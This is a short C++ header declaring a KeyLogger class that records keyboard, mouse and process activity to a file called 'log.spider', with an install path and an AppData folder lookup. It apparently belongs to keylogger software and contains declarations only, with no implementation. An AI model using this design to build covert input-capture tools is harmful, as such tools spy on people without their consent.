#pragma once

#include	"Keyboard.h"
#include	"Mouse.h"
#include	"Process.h"

#define		LOGFILE		"log.spider"

class KeyLogger
{
public:
	KeyLogger();
	virtual ~KeyLogger();

public:
	std::string		installPath;
	const std::string 			getFormatedTime(const std::string & format) const;
	const std::string 			getFormatedOutput() const;
	static const std::string	getAppDataFolder();

	void					writeInputs(const std::string & filename);
	void					write(const std::string & filename) const;
	void					read();
	void					init();
	void					run();

private:
	Process					process;
	Keyboard				keyboard;
	Mouse					mouse;
	time_t					start;
};